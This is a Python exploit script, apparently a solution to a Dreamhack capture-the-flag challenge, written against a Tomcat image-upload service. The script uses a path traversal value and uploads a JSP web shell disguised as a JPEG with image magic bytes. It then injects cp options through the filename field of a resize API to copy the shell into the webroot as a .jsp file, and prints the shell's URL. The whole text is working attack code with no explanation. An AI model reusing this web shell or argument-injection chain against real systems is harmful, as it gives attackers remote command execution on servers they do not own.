import requests
import json

url = "http://host1.dreamhack.games:16980"

cookies={"JSESSIONID":"74699B9237AA45BABE23C2EBFDC1D3A0"}

res=requests.post(url+"/", data={"name":"../../../../../../../../usr/local/tomcat/uploads/*"}, allow_redirects=False)
setCookie = res.headers["Set-Cookie"].split(";")[0].split("=")
cookies[setCookie[0]]=setCookie[1]

shell = b'''\xff\xd8\xff<%@ page import="java.util.*,java.util.stream.*"%><%if(request.getParameter("cmd")!=null){ProcessBuilder p=new ProcessBuilder("/bin/sh","-c",request.getParameter("cmd"));p.redirectErrorStream(true);Scanner s=new Scanner(p.start().getInputStream()).useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");}%>'''

requests.post(url+"/image/upload", cookies=cookies, files={'file': ('y54616.jpg', shell, 'image/jpg') })

res = requests.get(url+"/api/test/check", cookies=cookies)
resJson = json.loads(res.text)
jpg = resJson["message"].split("uploads")[1][1:69]

# cp uploads/{51424e2dd5703aa8700edd28f21097d4a99568eb9914600ab6f6d20209cb9db2.jpg --backup --suffix=.jsp -t /usr/local/tomcat/webapps/ROOT/resources -r} /tmp
# 51424e2dd5703aa8700edd28f21097d4a99568eb9914600ab6f6d20209cb9db2.jpg --backup --suffix=.jsp -t /usr/local/tomcat/webapps/ROOT/resources -r

requests.post(url+"/api/image/resize", cookies=cookies, files={'width': (None, "100", None) ,'height': (None, "100", None) ,'filename': (None, jpg+" -t /usr/local/tomcat/webapps/ROOT -r", None) })
requests.post(url+"/api/image/resize", cookies=cookies, files={'width': (None, "100", None) ,'height': (None, "100", None) ,'filename': (None, jpg+" --backup --suffix=yc54616.jsp -t /usr/local/tomcat/webapps/ROOT -r", None) })

print(url+"/"+jpg+"yc54616.jsp")